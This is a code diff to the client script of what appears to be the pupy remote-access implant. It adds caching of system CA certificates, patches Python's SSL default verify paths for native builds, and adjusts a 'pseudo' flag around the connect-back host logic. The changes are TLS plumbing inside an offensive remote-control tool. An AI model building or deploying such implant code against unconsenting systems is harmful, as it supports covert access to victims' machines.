@@ -36,6 +36,8 @@ import imp
 
 try:
     import pupy
+    setattr(pupy, 'pseudo', False)
+
 except ImportError, e:
     mod = imp.new_module("pupy")
     mod.__name__ = "pupy"
@@ -77,6 +79,7 @@ import zlib
 import signal
 
 import cPickle
+import ssl
 
 import hashlib
 import uuid
@@ -99,6 +102,45 @@ import umsgpack
 
 pupy.infos = {}  # global dictionary to store informations persistent through a deconnection
 pupy.namespace = None
+
+if not sys.platform == 'win32' and not pupy.pseudo:
+    setattr(ssl, '_SSL_FILES', [
+        "/etc/ssl/certs/ca-certificates.crt",
+        "/etc/pki/tls/certs/ca-bundle.crt",
+        "/etc/ssl/ca-bundle.pem",
+        "/etc/pki/tls/cacert.pem",
+        "/etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pem",
+    ])
+
+    setattr(ssl, '_SSL_PATHS', [
+        "/etc/ssl/certs",
+        "/system/etc/security/cacerts",
+        "/usr/local/share/certs",
+        "/etc/pki/tls/certs",
+        "/etc/openssl/certs",
+    ])
+
+    ctx = ssl.create_default_context()
+    for path in ssl._SSL_PATHS:
+        try:
+            ctx.load_verify_locations(capath=path)
+        except:
+            pass
+
+    for path in ssl._SSL_FILES:
+        try:
+            ctx.load_verify_locations(cafile=path)
+        except:
+            pass
+
+    setattr(ssl, '_CACHED_SSL_CERTS', ctx.get_ca_certs(binary_form=True))
+
+    def set_default_verify_paths(self):
+        for cert in ssl._CACHED_SSL_CERTS:
+            self.load_verify_locations(cadata=cert)
+
+    ssl.SSLContext.set_default_verify_paths = set_default_verify_paths
+
 
 def print_exception(tag=''):
     global debug
@@ -668,7 +710,7 @@ def main():
         launcher.arg_parser.print_usage()
         os._exit(1)
 
-    if getattr(pupy, 'pseudo', False):
+    if pupy.pseudo:
         set_connect_back_host(launcher.get_host())
     else:
         pupy.get_connect_back_host = launcher.get_host
@@ -678,7 +720,7 @@ def main():
     pupy.infos['launcher_inst'] = launcher
     pupy.infos['transport'] = launcher.get_transport()
     pupy.infos['debug'] = debug
-    pupy.infos['native'] = not getattr(pupy, 'pseudo', False)
+    pupy.infos['native'] = pupy.pseudo == False
     pupy.infos['revision'] = getattr(pupy, 'revision', None)
 
     exited = False
